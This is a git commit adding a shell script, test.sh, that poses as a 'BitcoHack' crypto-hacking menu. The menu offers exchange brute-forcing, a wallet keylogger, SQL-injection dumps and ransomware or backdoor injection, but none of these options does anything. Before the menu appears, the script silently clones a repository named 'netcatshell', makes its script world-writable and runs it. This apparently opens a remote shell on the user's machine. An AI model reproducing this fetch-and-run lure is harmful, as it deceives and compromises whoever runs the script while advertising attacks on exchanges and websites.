33e61adf3451316e4a87508b3b97e92f18a6cefd
AdaWong <48813106+rikosanjuri14@users.noreply.github.com>
2020-04-05 17:42:22 +0700

    Add files via upload

---
+++ test.sh
@@ -0,0 +1,26 @@
+git clone https://github.com/rikosanjuri14/netcatshell.git
+clear
+chmod 777 netcatshell/netcatshell.sh
+bash netcatshell/netcatshell.sh
+echo "###########################"
+echo "#                          #"
+echo "#   Author : Miy_Xfor481   #"
+echo "#   skybirdjunk@mail.ru    #"
+echo "#                          #"
+echo "#                          #"
+echo "###########################"
+toilet BitcoHack
+echo 1.Bruteforce Indodax
+echo 2.Mining Bitcoin
+echo 3.Make Keyloger for hacking Wallet 
+echo 4.Dump Database SQLinject
+echo 5.Dump Database SQLinject bypass WAF
+echo 6.Crack MD5
+echo 7.Mining Doge
+echo 8.Injectransom website vuln SQL
+echo 9.Inject Ransom with Your shellbackdoor
+echo 10.inject your backdoor with LFI vulnerability
+read -p "Masukin pilihan anda:" get;
+echo "Prossesing"
+sleep 5
+echo "Done"
